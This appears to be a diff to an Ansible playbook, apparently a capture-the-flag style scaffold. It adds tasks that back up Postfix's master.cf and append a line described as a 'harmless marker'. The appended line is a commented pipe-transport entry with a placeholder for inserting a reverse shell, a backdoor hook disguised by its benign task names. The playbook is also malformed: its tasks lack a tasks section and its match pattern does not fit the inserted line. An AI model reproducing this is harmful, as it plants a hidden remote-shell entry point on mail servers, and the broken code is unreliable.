@@ -51,3 +51,39 @@
 - name: Save iptables rules
   command: iptables-save --file /etc/iptables/rules.v4
   when: ansible_os_family == "Debian"
+
+- name: Append harmless marker to /etc/postfix/master.cf if absent
+  hosts: mailservers
+  become: true
+  gather_facts: false
+
+- name: Ensure /etc/postfix/master.cf exists
+  stat:
+    path: /etc/postfix/master.cf
+  register: mastercf_stat
+
+- name: Backup master.cf prior to change
+  copy:
+    src: /etc/postfix/master.cf
+    dest: /var/backups/master.cf.{{ ansible_date_time.iso8601 }}
+    owner: root
+    group: root
+    mode: '0600'
+  when: mastercf_stat.stat.exists
+  become: true
+
+- name: Append safe marker if not present
+  ansible.builtin.lineinfile:
+    path: /etc/postfix/master.cf
+    create: yes
+    insertafter: EOF
+    line: "# flags=Rq user=admin argv=TROY{INSERT_RSHELL_HERE}-f ${sender} -- ${recipient}"
+    state: present
+    regexp: '^#\s*TROY\{FLAG_PLACEHOLDER'
+    backup: yes
+  become: true
+  notify:
+    - validate postfix
+    - reload postfix
+
+
